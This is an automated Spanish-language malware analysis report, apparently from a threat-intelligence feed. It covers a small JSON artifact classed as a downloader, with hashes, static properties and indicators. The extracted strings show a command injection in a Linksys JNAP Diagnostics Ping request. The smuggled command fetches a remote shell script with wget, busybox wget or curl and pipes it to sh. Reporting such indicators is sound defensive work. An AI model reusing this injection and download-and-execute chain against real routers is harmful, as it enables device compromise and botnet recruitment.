# 🧬 Payload Analysis

`d2dc01bbad0991b4d326bd59ae71a5f396a86612789a5af6aac8fda112b714d6`

## 📌 Resumen

Artefacto identificado como JSON text data de 307 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d2dc01bbad0991b4d326bd59ae71a5f396a86612789a5af6aac8fda112b714d6`
- **SHA1:** `02f6e065acdf2c914760ec1b8e53c218a8457341`
- **MD5:** `0a6f05d68d5b42f177baf46d2e4a24de`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 307 B |
| Entropía | 5.09 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd%20/tmp%3Bwget
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap2 | strings |
| url | hxxp://linksys[.]com/jnap/network/Diagnostics | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd%20/tmp%3Bwget | strings |
| hash | d2dc01bbad0991b4d326bd59ae71a5f396a86612789a5af6aac8fda112b714d6 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
